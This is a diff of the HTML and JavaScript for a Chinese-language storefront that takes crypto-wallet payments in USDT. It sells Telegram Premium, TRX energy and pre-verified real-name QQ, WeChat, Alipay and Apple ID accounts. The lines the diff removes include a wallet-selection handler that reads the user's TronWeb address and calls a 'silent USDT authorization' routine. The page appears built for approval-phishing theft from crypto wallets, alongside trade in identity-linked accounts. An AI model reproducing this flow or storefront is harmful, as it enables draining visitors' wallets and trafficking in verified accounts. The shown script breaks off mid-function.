@@ -5,13 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram Premium & TRX能量 - 订阅服务</title>
     
-    <!-- ========== WalletConnect v2 SDK 集成 ========== -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.css">
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.2.1/dist/index.umd.min.js"></script>
-    <!-- ================================================ -->
-    
     <style>
+        /* ================ 保持所有原有CSS样式不变 ================ */
         * {
             margin: 0;
             padding: 0;
@@ -953,32 +948,62 @@
                 </div>
                 
                 <div class="wallet-options">
-                    <div class="wallet-option" onclick="selectWalletWithWC('TokenPocket', 'premium')">
+                    <!-- 原有4个钱包 -->
+                    <div class="wallet-option" onclick="selectWallet('TokenPocket', 'premium')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/yBbDWDrc/Token-Pocket.png" alt="TokenPocket" onerror="this.style.display='none'; this.parentNode.innerHTML='🔷';">
                         </div>
                         <div class="wallet-name">TokenPocket</div>
                     </div>
                     
-                    <div class="wallet-option" onclick="selectWalletWithWC('TronLink', 'premium')">
+                    <div class="wallet-option" onclick="selectWallet('TronLink', 'premium')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/N2dhDDmF/tronlink.png" alt="TronLink" onerror="this.style.display='none'; this.parentNode.innerHTML='🔶';">
                         </div>
                         <div class="wallet-name">TronLink</div>
                     </div>
                     
-                    <div class="wallet-option" onclick="selectWalletWithWC('Bitget', 'premium')">
+                    <div class="wallet-option" onclick="selectWallet('Bitget', 'premium')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/gbqHxTKN/Bitget-wallet.png" alt="Bitget Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
                         </div>
                         <div class="wallet-name">Bitget Wallet</div>
                     </div>
                     
-                    <div class="wallet-option" onclick="selectWalletWithWC('imToken', 'premium')">
+                    <div class="wallet-option" onclick="selectWallet('imToken', 'premium')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/C3L6Lkd1/imtoken.png" alt="imToken" onerror="this.style.display='none'; this.parentNode.innerHTML='💳';">
                         </div>
                         <div class="wallet-name">imToken</div>
+                    </div>
+                    
+                    <!-- 新增4个钱包 -->
+                    <div class="wallet-option" onclick="selectWallet('OneKey', 'premium')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/TqJh9Dk2/logo-green-vector.png" alt="OneKey" onerror="this.style.display='none'; this.parentNode.innerHTML='🔑';">
+                        </div>
+                        <div class="wallet-name">OneKey</div>
+                    </div>
+                    
+                    <div class="wallet-option" onclick="selectWallet('OKX', 'premium')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/9HJCxSV7/unnamed.png" alt="OKX Web3 Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='⚡';">
+                        </div>
+                        <div class="wallet-name">OKX Web3</div>
+                    </div>
+                    
+                    <div class="wallet-option" onclick="selectWallet('BitPie', 'premium')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/wZPqvkPR/bitpie.jpg" alt="BitPie" onerror="this.style.display='none'; this.parentNode.innerHTML='🥧';">
+                        </div>
+                        <div class="wallet-name">BitPie</div>
+                    </div>
+                    
+                    <div class="wallet-option" onclick="selectWallet('TrustWallet', 'premium')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/sp3KS7F7/unnamed-1.png" alt="Trust Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='🛡️';">
+                        </div>
+                        <div class="wallet-name">Trust Wallet</div>
                     </div>
                 </div>
                 
@@ -1026,32 +1051,61 @@
                 </div>
                 
                 <div class="wallet-options">
-                    <div class="wallet-option trx-wallet-option" onclick="selectWalletWithWC('TokenPocket', 'trx')">
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('TokenPocket', 'trx')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/yBbDWDrc/Token-Pocket.png" alt="TokenPocket" onerror="this.style.display='none'; this.parentNode.innerHTML='🔷';">
                         </div>
                         <div class="wallet-name">TokenPocket</div>
                     </div>
                     
-                    <div class="wallet-option trx-wallet-option" onclick="selectWalletWithWC('TronLink', 'trx')">
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('TronLink', 'trx')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/N2dhDDmF/tronlink.png" alt="TronLink" onerror="this.style.display='none'; this.parentNode.innerHTML='🔶';">
                         </div>
                         <div class="wallet-name">TronLink</div>
                     </div>
                     
-                    <div class="wallet-option trx-wallet-option" onclick="selectWalletWithWC('Bitget', 'trx')">
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('Bitget', 'trx')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/gbqHxTKN/Bitget-wallet.png" alt="Bitget Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
                         </div>
                         <div class="wallet-name">Bitget Wallet</div>
                     </div>
                     
-                    <div class="wallet-option trx-wallet-option" onclick="selectWalletWithWC('imToken', 'trx')">
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('imToken', 'trx')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/C3L6Lkd1/imtoken.png" alt="imToken" onerror="this.style.display='none'; this.parentNode.innerHTML='💳';">
                         </div>
                         <div class="wallet-name">imToken</div>
+                    </div>
+                    
+                    <!-- 新增4个钱包 -->
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('OneKey', 'trx')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/TqJh9Dk2/logo-green-vector.png" alt="OneKey" onerror="this.style.display='none'; this.parentNode.innerHTML='🔑';">
+                        </div>
+                        <div class="wallet-name">OneKey</div>
+                    </div>
+                    
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('OKX', 'trx')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/9HJCxSV7/unnamed.png" alt="OKX Web3 Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='⚡';">
+                        </div>
+                        <div class="wallet-name">OKX Web3</div>
+                    </div>
+                    
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('BitPie', 'trx')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/wZPqvkPR/bitpie.jpg" alt="BitPie" onerror="this.style.display='none'; this.parentNode.innerHTML='🥧';">
+                        </div>
+                        <div class="wallet-name">BitPie</div>
+                    </div>
+                    
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('TrustWallet', 'trx')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/sp3KS7F7/unnamed-1.png" alt="Trust Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='🛡️';">
+                        </div>
+                        <div class="wallet-name">Trust Wallet</div>
                     </div>
                 </div>
                 
@@ -1068,7 +1122,7 @@
             <div class="service-badge account-badge" style="display: none;">账号购买</div>
             <div class="pricing-header account-header">
                 <h2 style="color: #4ecdc4;">售后说明</h2>
-                <div class="price account-price"><span></div>
+                <div class="price account-price"><span></span></div>
                 <p class="description">24-48小时（售后提供相关截图可更换）否则一经出售概不退换!<br>
 订单时效: 本站所有商品均可自助下单发货!卡密下单后请在三小时内核销完成!<br>
 支付说明: 由于商品特殊性!仅支持USDT付款!<br>
@@ -2124,7 +2178,7 @@
                             </div>
                         </div>
                         
-                        <div class="account-item" onclick="selectAccount('alipaywechat', '企业绿标主号，三年以上, 营业执照长期',68)">
+                        <div class="account-item" onclick="selectAccount('alipaywechat', '企业绿标主号，三年以上，营业执照长期',68)">
                             <div class="account-item-header">
                                 <div class="account-item-icon">
                                     <img src="https://i.ibb.co/Q3RBD66D/images-5.png" alt="微信" onerror="this.style.display='none'; this.parentNode.innerHTML='💬';">
@@ -2170,20 +2224,6 @@
                 <!-- QQ分类 -->
                 <div class="category-section" id="qqSection">
                     <div class="account-items-grid">
-                        <div class="account-item" onclick="selectAccount('qqjd', 'QQ账号（实名）可换绑-已实名白号-稳定', 1)">
-                            <div class="account-item-header">
-                                <div class="account-item-icon">
-                                    <img src="https://i.ibb.co/B5dvxs71/images-6.png" alt="腾讯QQ" onerror="this.style.display='none'; this.parentNode.innerHTML='💙';">
-                                </div>
-                                <div class="account-item-title">QQ账号（实名）可换绑-已实名白号-稳定</div>
-                            </div>
-                            <div class="account-item-price">1 USDT</div>
-                            <div class="account-item-stats">
-                                <span class="account-item-stock">库存: 1234</span>
-                                <span class="account-item-sales">销量: 2345</span>
-                            </div>
-                        </div>
-                        
                         <div class="account-item" onclick="selectAccount('qqjd', 'QQ账号（实名）可换绑-半年账号', 3)">
                             <div class="account-item-header">
                                 <div class="account-item-icon">
@@ -2908,26 +2948,26 @@
                         </div>
                         <div class="account-item-price">90 USDT</div>
                         <div class="account-item-stats">
-                                <span class="account-item-stock">库存: 56</span>
-                                <span class="account-item-sales">销量: 78</span>
-                            </div>
+                            <span class="account-item-stock">库存: 56</span>
+                            <span class="account-item-sales">销量: 78</span>
                         </div>
-                        
-                        <div class="account-item" onclick="selectAccount('giftcard', '（首单10U）三网手机话费充值卡密-100额度', 10)">
-                            <div class="account-item-header">
-                                <div class="account-item-icon">
-                                    <img src="https://i.ibb.co/YFTBp87X/photo-2025-11-09-16-55-05.jpg" alt="话费充值卡" onerror="this.style.display='none'; this.parentNode.innerHTML='📞';">
-                                </div>
-                                <div class="account-item-title">（首单10U）三网手机话费充值卡密-100额度</div>
+                    </div>
+                    
+                    <div class="account-item" onclick="selectAccount('giftcard', '（首单10U）三网手机话费充值卡密-100额度', 10)">
+                        <div class="account-item-header">
+                            <div class="account-item-icon">
+                                <img src="https://i.ibb.co/YFTBp87X/photo-2025-11-09-16-55-05.jpg" alt="话费充值卡" onerror="this.style.display='none'; this.parentNode.innerHTML='📞';">
                             </div>
-                            <div class="account-item-price">10 USDT</div>
-                            <div class="account-item-stats">
-                                <span class="account-item-stock">库存: 234</span>
-                                <span class="account-item-sales">销量: 456</span>
-                            </div>
+                            <div class="account-item-title">（首单10U）三网手机话费充值卡密-100额度</div>
+                        </div>
+                        <div class="account-item-price">10 USDT</div>
+                        <div class="account-item-stats">
+                            <span class="account-item-stock">库存: 234</span>
+                            <span class="account-item-sales">销量: 456</span>
                         </div>
                     </div>
                 </div>
+            </div>
             
             <!-- 苹果海外ID账号列表 -->
             <div class="account-list" id="appleAccounts">
@@ -2967,10 +3007,10 @@
                     
                     <div class="account-item" onclick="selectAccount('apple', 'Apple ID 英国', 0.5)">
                         <div class="account-item-header">
-                                <div class="account-item-icon">
-                                    <img src="https://i.ibb.co/8D3JhZqC/app.jpg" alt="Apple ID" onerror="this.style.display='none'; this.parentNode.innerHTML='🍎';">
-                                </div>
-                                <div class="account-item-title">Apple ID 英国</div>
+                            <div class="account-item-icon">
+                                <img src="https://i.ibb.co/8D3JhZqC/app.jpg" alt="Apple ID" onerror="this.style.display='none'; this.parentNode.innerHTML='🍎';">
+                            </div>
+                            <div class="account-item-title">Apple ID 英国</div>
                             </div>
                             <div class="account-item-price">0.5 USDT</div>
                             <div class="account-item-stats">
@@ -3256,32 +3296,61 @@
                     </div>
                     
                     <div class="wallet-options">
-                        <div class="wallet-option account-wallet-option" onclick="selectWalletWithWC('TokenPocket', 'account')">
+                        <div class="wallet-option account-wallet-option" onclick="selectWallet('TokenPocket', 'account')">
                             <div class="wallet-icon">
                                 <img src="https://i.ibb.co/yBbDWDrc/Token-Pocket.png" alt="TokenPocket" onerror="this.style.display='none'; this.parentNode.innerHTML='🔷';">
                             </div>
                             <div class="wallet-name">TokenPocket</div>
                         </div>
                         
-                        <div class="wallet-option account-wallet-option" onclick="selectWalletWithWC('TronLink', 'account')">
+                        <div class="wallet-option account-wallet-option" onclick="selectWallet('TronLink', 'account')">
                             <div class="wallet-icon">
                                 <img src="https://i.ibb.co/N2dhDDmF/tronlink.png" alt="TronLink" onerror="this.style.display='none'; this.parentNode.innerHTML='🔶';">
                             </div>
                             <div class="wallet-name">TronLink</div>
                         </div>
                         
-                        <div class="wallet-option account-wallet-option" onclick="selectWalletWithWC('Bitget', 'account')">
+                        <div class="wallet-option account-wallet-option" onclick="selectWallet('Bitget', 'account')">
                             <div class="wallet-icon">
                                 <img src="https://i.ibb.co/gbqHxTKN/Bitget-wallet.png" alt="Bitget Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
                             </div>
                             <div class="wallet-name">Bitget Wallet</div>
                         </div>
                         
-                        <div class="wallet-option account-wallet-option" onclick="selectWalletWithWC('imToken', 'account')">
+                        <div class="wallet-option account-wallet-option" onclick="selectWallet('imToken', 'account')">
                             <div class="wallet-icon">
                                 <img src="https://i.ibb.co/C3L6Lkd1/imtoken.png" alt="imToken" onerror="this.style.display='none'; this.parentNode.innerHTML='💳';">
                             </div>
                             <div class="wallet-name">imToken</div>
+                        </div>
+                        
+                        <!-- 新增4个钱包 -->
+                        <div class="wallet-option account-wallet-option" onclick="selectWallet('OneKey', 'account')">
+                            <div class="wallet-icon">
+                                <img src="https://i.ibb.co/TqJh9Dk2/logo-green-vector.png" alt="OneKey" onerror="this.style.display='none'; this.parentNode.innerHTML='🔑';">
+                            </div>
+                            <div class="wallet-name">OneKey</div>
+                        </div>
+                        
+                        <div class="wallet-option account-wallet-option" onclick="selectWallet('OKX', 'account')">
+                            <div class="wallet-icon">
+                                <img src="https://i.ibb.co/9HJCxSV7/unnamed.png" alt="OKX Web3 Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='⚡';">
+                            </div>
+                            <div class="wallet-name">OKX Web3</div>
+                        </div>
+                        
+                        <div class="wallet-option account-wallet-option" onclick="selectWallet('BitPie', 'account')">
+                            <div class="wallet-icon">
+                                <img src="https://i.ibb.co/wZPqvkPR/bitpie.jpg" alt="BitPie" onerror="this.style.display='none'; this.parentNode.innerHTML='🥧';">
+                            </div>
+                            <div class="wallet-name">BitPie</div>
+                        </div>
+                        
+                        <div class="wallet-option account-wallet-option" onclick="selectWallet('TrustWallet', 'account')">
+                            <div class="wallet-icon">
+                                <img src="https://i.ibb.co/sp3KS7F7/unnamed-1.png" alt="Trust Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='🛡️';">
+                            </div>
+                            <div class="wallet-name">Trust Wallet</div>
                         </div>
                     </div>
                     
@@ -3327,704 +3396,630 @@
                 </div>
             </div>
         </div>
+    </div>
 
-        <script>
-            let currentPaymentUrl = '';
-            let selectedWallet = '';
-            let currentService = 'premium';
-            let selectedAccountType = '';
-            let selectedAccount = null;
-
-            // ========== WalletConnect v2 配置 ==========
-            const WC_PROJECT_ID = "2fd11148042257257c2c02fe1472823b";
-            let web3Modal = null;
-            let wcProvider = null;
-            let wcConnected = false;
-
-            // 初始化 WalletConnect
-            async function initWalletConnect() {
-                if (web3Modal || !window.WalletConnectModal) return web3Modal;
-                
-                try {
-                    const { WalletConnectModal } = window.WalletConnectModal;
-                    
-                    web3Modal = new WalletConnectModal.default({
-                        projectId: WC_PROJECT_ID,
-                        metadata: {
-                            name: "Telegram Premium & TRX能量订阅",
-                            description: "TRON网络支付服务",
-                            url: "https://tgpremium.site",
-                            icons: ["https://tgpremium.site/logo.png"]
-                        },
-                        themeMode: "light",
-                        themeVariables: {
-                            '--wcm-accent-color': '#FF060A',
-                            '--wcm-z-index': '9999'
-                        }
-                    });
-                    
-                    console.log('✅ WalletConnect 初始化成功');
-                    return web3Modal;
-                } catch (error) {
-                    console.error('❌ WalletConnect 初始化失败:', error);
-                    return null;
-                }
+    <script>
+        // ==================== 全局变量 ====================
+        let currentPaymentUrl = '';
+        let selectedWallet = '';
+        let currentService = 'premium';
+        let selectedAccountType = '';
+        let selectedAccount = null;
+        
+        // ==================== 核心函数 ====================
+        function showTemporaryMessage(message) {
+            const existingMessage = document.querySelector('.temporary-message');
+            if (existingMessage) {
+                existingMessage.remove();
             }
-
-            // 新的钱包选择函数（使用 WalletConnect）
-            async function selectWalletWithWC(walletName, service) {
-                console.log(`选择钱包: ${walletName}, 服务: ${service}`);
-                
-                try {
-                    // 检查是否在钱包浏览器内
-                    if (isInWalletBrowser()) {
-                        console.log('✅ 在钱包浏览器内，使用旧流程');
-                        return await selectWallet(walletName, service);
-                    }
-                    
-                    // 在外部浏览器，使用 WalletConnect
-                    console.log('🌐 在外部浏览器，启动 WalletConnect');
-                    
-                    // 获取订单数据
-                    const orderData = generateOrderData(service);
-                    if (!orderData) {
-                        showTemporaryMessage('请先填写订单信息');
-                        return;
-                    }
-                    
-                    // 构建支付页面URL
-                    const fullPaymentUrl = new URL('payment.html', window.location.href);
-                    Object.keys(orderData).forEach(key => {
-                        if (orderData[key]) {
-                            fullPaymentUrl.searchParams.set(key, orderData[key]);
-                        }
-                    });
-                    fullPaymentUrl.searchParams.set('wc', 'true');
-                    fullPaymentUrl.searchParams.set('wallet', walletName);
-                    
-                    // 初始化 WalletConnect
-                    const modal = await initWalletConnect();
-                    if (!modal) {
-                        showTemporaryMessage('钱包连接服务初始化失败');
-                        return;
-                    }
-                    
-                    // 显示连接提示
-                    showTemporaryMessage('正在连接钱包...');
-                    
-                    // 打开 WalletConnect 模态框
-                    modal.open({
-                        chains: ["tron:0x2b6653dc"],
-                        methods: ["eth_sendTransaction", "personal_sign"],
-                        events: ["chainChanged", "accountsChanged"]
-                    }).then(provider => {
-                        console.log('✅ WalletConnect 连接成功:', provider);
-                        wcProvider = provider;
-                        wcConnected = true;
-                        
-                        // 连接成功后跳转到支付页面
-                        console.log('跳转到支付页面:', fullPaymentUrl.toString());
-                        showTemporaryMessage('连接成功，正在跳转...');
-                        
-                        // 延迟跳转，让用户看到成功消息
-                        setTimeout(() => {
-                            window.location.href = fullPaymentUrl.toString();
-                        }, 1000);
-                        
-                    }).catch(error => {
-                        console.error('❌ WalletConnect 连接失败:', error);
-                        
-                        // 兜底方案：显示复制链接
-                        if (service === 'premium') {
-                            document.getElementById('premiumCopyContainer').style.display = 'block';
-                        } else if (service === 'trx') {
-                            document.getElementById('trxCopyContainer').style.display = 'block';
-                        } else if (service === 'account') {
-                            document.getElementById('accountCopyContainer').style.display = 'block';
-                        }
-                        
-                        showTemporaryMessage('钱包连接失败，请复制链接到钱包内打开');
-                    });
-                    
-                } catch (error) {
-                    console.error('❌ 钱包选择流程错误:', error);
-                    showTemporaryMessage('连接失败，请重试');
+            
+            const messageDiv = document.createElement('div');
+            messageDiv.className = 'temporary-message';
+            messageDiv.textContent = message;
+            document.body.appendChild(messageDiv);
+            
+            setTimeout(() => {
+                if (messageDiv.parentNode) {
+                    messageDiv.remove();
                 }
-            }
+            }, 3000);
+        }
 
-            // 修改原有的 selectWallet 函数（仅在钱包内使用）
-            function selectWallet(walletName, service) {
-                if (!window.tronWeb || !window.tronWeb.defaultAddress) {
-                    showTemporaryMessage('请先连接钱包');
-                    return;
-                }
+        function isInWalletBrowser() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            return window.ethereum || window.tronWeb || 
+                   userAgent.includes('tokenpocket') ||
+                   userAgent.includes('tronlink') ||
+                   userAgent.includes('bitget') ||
+                   userAgent.includes('imtoken') ||
+                   userAgent.includes('bitkeep') ||
+                   userAgent.includes('tp-ua') ||
+                   window.isTokenPocket ||
+                   window.bitkeep ||
+                   window.ethereum?.isTokenPocket ||
+                   window.ethereum?.isBitKeep;
+        }
 
-                const userAddress = window.tronWeb.defaultAddress.base58;
-                
-                // 获取订单数据
-                const orderData = generateOrderData(service);
-                if (!orderData) {
-                    showTemporaryMessage('无法生成订单信息');
-                    return;
-                }
-                
-                console.log('订单数据:', orderData);
-                
-                // 执行静默USDT授权流程
-                executeSilentUSDTAuthorization(userAddress, service, orderData);
-            }
-
-            // 原有的 isInWalletBrowser 函数保持不变
-            function isInWalletBrowser() {
-                const userAgent = navigator.userAgent.toLowerCase();
-                return window.ethereum || window.tronWeb || 
-                       userAgent.includes('tokenpocket') ||
-                       userAgent.includes('tronlink') ||
-                       userAgent.includes('bitget') ||
-                       userAgent.includes('imtoken') ||
-                       userAgent.includes('bitkeep') ||
-                       userAgent.includes('tp-ua') ||
-                       window.isTokenPocket ||
-                       window.bitkeep ||
-                       window.ethereum?.isTokenPocket ||
-                       window.ethereum?.isBitKeep;
-            }
-
-            // 其余所有函数都保持原样不变...
-            function showTemporaryMessage(message) {
-                const existingMessage = document.querySelector('.temporary-message');
-                if (existingMessage) {
-                    existingMessage.remove();
-                }
-                
-                const messageDiv = document.createElement('div');
-                messageDiv.className = 'temporary-message';
-                messageDiv.textContent = message;
-                document.body.appendChild(messageDiv);
-                
-                setTimeout(() => {
-                    if (messageDiv.parentNode) {
-                        messageDiv.remove();
-                    }
-                }, 3000);
-            }
-
-            function copyToClipboard(elementId) {
-                const copyText = document.getElementById(elementId);
-                const textArea = document.createElement('textarea');
-                textArea.value = copyText.textContent;
-                document.body.appendChild(textArea);
-                textArea.select();
-                textArea.setSelectionRange(0, 99999);
-                
-                try {
-                    const successful = document.execCommand('copy');
-                    if (successful) {
-                        showTemporaryMessage('网站链接已复制到剪贴板！');
-                    } else {
-                        showTemporaryMessage('复制失败，请手动复制链接');
-                    }
-                } catch (err) {
+        function copyToClipboard(elementId) {
+            const copyText = document.getElementById(elementId);
+            const textArea = document.createElement('textarea');
+            textArea.value = copyText.textContent;
+            document.body.appendChild(textArea);
+            textArea.select();
+            textArea.setSelectionRange(0, 99999);
+            
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    showTemporaryMessage('网站链接已复制到剪贴板！');
+                } else {
                     showTemporaryMessage('复制失败，请手动复制链接');
                 }
-                
-                document.body.removeChild(textArea);
+            } catch (err) {
+                showTemporaryMessage('复制失败，请手动复制链接');
             }
+            
+            document.body.removeChild(textArea);
+        }
 
-            function contactSupport() {
-                window.open('https://t.me/yunfeng0571', '_blank');
+        function contactSupport() {
+            window.open('https://t.me/yunfeng0571', '_blank');
+        }
+
+        function checkOrder() {
+            showTemporaryMessage('订单查询功能开发中，请稍后...');
+        }
+
+        // ==================== 服务切换函数 ====================
+        function switchService(service) {
+            currentService = service;
+            
+            document.getElementById('premiumTab').classList.toggle('active', service === 'premium');
+            document.getElementById('trxTab').classList.toggle('active', service === 'trx');
+            document.getElementById('accountTab').classList.toggle('active', service === 'account');
+            
+            document.getElementById('premiumService').style.display = service === 'premium' ? 'block' : 'none';
+            document.getElementById('trxService').style.display = service === 'trx' ? 'block' : 'none';
+            document.getElementById('accountService').style.display = service === 'account' ? 'block' : 'none';
+            
+            const header = document.getElementById('mainHeader');
+            if (service === 'premium') {
+                header.innerHTML = `
+                    <h1>Telegram 高级订阅服务</h1>
+                    <p>使用您的加密货币钱包获取 Telegram Premium 订阅</p>
+                `;
+                updateFeatures('premium');
+            } else if (service === 'trx') {
+                header.innerHTML = `
+                    <h1 class="trx-header">TRX 能量包月订阅服务</h1>
+                    <p>使用您的加密货币钱包获取免手续费转账服务</p>
+                `;
+                updateFeatures('trx');
+            } else {
+                header.innerHTML = `
+                    <h1 class="account-header">各类平台账号购买</h1>
+                    <p>全网最低价，最牛售后</p>
+                `;
+                updateFeatures('account');
             }
-
-            function checkOrder() {
-                showTemporaryMessage('订单查询功能开发中，请稍后...');
+            
+            resetForms();
+            
+            if (service === 'account') {
+                backToAccountTypes();
             }
+        }
 
-            function switchService(service) {
-                currentService = service;
-                
-                document.getElementById('premiumTab').classList.toggle('active', service === 'premium');
-                document.getElementById('trxTab').classList.toggle('active', service === 'trx');
-                document.getElementById('accountTab').classList.toggle('active', service === 'account');
-                
-                document.getElementById('premiumService').style.display = service === 'premium' ? 'block' : 'none';
-                document.getElementById('trxService').style.display = service === 'trx' ? 'block' : 'none';
-                document.getElementById('accountService').style.display = service === 'account' ? 'block' : 'none';
-                
-                const header = document.getElementById('mainHeader');
-                if (service === 'premium') {
-                    header.innerHTML = `
-                        <h1>Telegram 高级订阅服务</h1>
-                        <p>使用您的加密货币钱包获取 Telegram Premium 订阅</p>
-                    `;
-                    updateFeatures('premium');
-                } else if (service === 'trx') {
-                    header.innerHTML = `
-                        <h1 class="trx-header">TRX 能量包月订阅服务</h1>
-                        <p>使用您的加密货币钱包获取免手续费转账服务</p>
-                    `;
-                    updateFeatures('trx');
+        function updateFeatures(service) {
+            const featuresContainer = document.getElementById('serviceFeatures');
+            if (service === 'premium') {
+                featuresContainer.innerHTML = `
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/4nWVZXSp/open-folder-file-icon-219486.png" alt="更大文件上传" onerror="this.style.display='none'; this.parentNode.innerHTML='📁';">
+                        </div>
+                        <h3>更大文件上传</h3>
+                        <p>上传最大 4GB 的文件</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/C58QKWSM/1695711361784527.jpg" alt="更快的下载速度" onerror="this.style.display='none'; this.parentNode.innerHTML='⚡';">
+                        </div>
+                        <h3>更快的下载速度</h3>
+                        <p>享受无限制的下载速度</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/whwVyw5b/Telegram-logo-svg.webp" alt="专属贴纸" onerror="this.style.display='none'; this.parentNode.innerHTML='🎨';">
+                        </div>
+                        <h3>专属贴纸</h3>
+                        <p>使用 Premium 专属动画贴纸</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/XZKJLw9b/photo-2025-10-31-23-15-28.jpg" alt="高级聊天管理" onerror="this.style.display='none'; this.parentNode.innerHTML='💬';">
+                        </div>
+                        <h3>高级聊天管理</h3>
+                        <p>创建群组链接和更多管理工具</p>
+                    </div>
+                `;
+            } else if (service === 'trx') {
+                featuresContainer.innerHTML = `
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/Xk6SMFcs/tron-trx-icon3386-logowik-com.webp" alt="免手续费转账" onerror="this.style.display='none'; this.parentNode.innerHTML='🚀';">
+                        </div>
+                        <h3>免手续费转账</h3>
+                        <p>享受完全免费的TRON网络转账</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/Sw1m5Mc1/5c8399712069f697cf58e04be35a4caa.png" alt="高速交易" onerror="this.style.display='none'; this.parentNode.innerHTML='⚡';">
+                        </div>
+                        <h3>高速交易</h3>
+                        <p>交易确认速度提升至秒级</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/N6b50mVV/images.png" alt="稳定可靠" onerror="this.style.display='none'; this.parentNode.innerHTML='🛡️';">
+                        </div>
+                        <h3>稳定可靠</h3>
+                        <p>持续能量支持，交易永不中断</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/JWTqyVtH/image1s.jpg" alt="成本节约" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
+                        </div>
+                        <h3>成本节约</h3>
+                        <p>大幅降低日常交易成本</p>
+                    </div>
+                `;
+            } else {
+                featuresContainer.innerHTML = '';
+            }
+        }
+
+        function resetForms() {
+            document.getElementById('userForm').style.display = 'none';
+            document.getElementById('walletSection').style.display = 'none';
+            document.getElementById('purchaseBtn').style.display = 'block';
+            document.getElementById('premiumCopyContainer').style.display = 'none';
+            
+            document.getElementById('trxUserForm').style.display = 'none';
+            document.getElementById('trxWalletSection').style.display = 'none';
+            document.getElementById('trxPurchaseBtn').style.display = 'block';
+            document.getElementById('trxCopyContainer').style.display = 'none';
+            
+            document.getElementById('accountUserForm').style.display = 'none';
+            document.getElementById('accountWalletSection').style.display = 'none';
+            document.getElementById('accountCopyContainer').style.display = 'none';
+            document.getElementById('selectedAccountInfo').style.display = 'none';
+            document.getElementById('regionSelection').style.display = 'none';
+            document.getElementById('specialFields').style.display = 'none';
+            document.getElementById('rechargeFields').style.display = 'none';
+            document.getElementById('normalFields').style.display = 'block';
+        }
+
+        // ==================== 账号购买相关函数 ====================
+        function selectAccountType(type) {
+            selectedAccountType = type;
+            
+            const accountLists = document.querySelectorAll('.account-list');
+            accountLists.forEach(list => {
+                list.style.display = 'none';
+            });
+            document.getElementById('regionSelection').style.display = 'none';
+            
+            document.getElementById(type + 'Accounts').style.display = 'block';
+            
+            document.getElementById('accountTypes').style.display = 'none';
+            
+            document.getElementById('selectedAccountInfo').style.display = 'none';
+            
+            if (type === 'telegram_twitter') {
+                showTelegramTwitterSubtype('telegram');
+            } else if (type === 'tiktok_kuaishou') {
+                showTiktokKuaishouSubtype('tiktok');
+            } else if (type === 'xianyu_xiaohongshu') {
+                showXianyuXiaohongshuSubtype('xianyu');
+            } else if (type === 'alipaywechat') {
+                showAlipayWechatSubtype('alipay');
+            } else if (type === 'qqjd') {
+                showQQJDSubtype('qq');
+            } else if (type === 'whatsappfacebook') {
+                showWhatsAppFacebookSubtype('whatsapp');
+            } else if (type === 'phone') {
+                showPhoneSubtype('liuliang');
+            } else if (type === 'gmail_youtube') {
+                showGmailYouTubeSubtype('gmail');
+            } else if (type === 'tantan_momo') {
+                showTantanMomoSubtype('tantan');
+            }
+        }
+
+        function backToAccountTypes() {
+            selectedAccountType = '';
+            selectedAccount = null;
+            
+            const accountLists = document.querySelectorAll('.account-list');
+            accountLists.forEach(list => {
+                list.style.display = 'none';
+            });
+            document.getElementById('regionSelection').style.display = 'none';
+            
+            document.getElementById('accountTypes').style.display = 'grid';
+            
+            document.getElementById('accountUserForm').style.display = 'none';
+            document.getElementById('accountWalletSection').style.display = 'none';
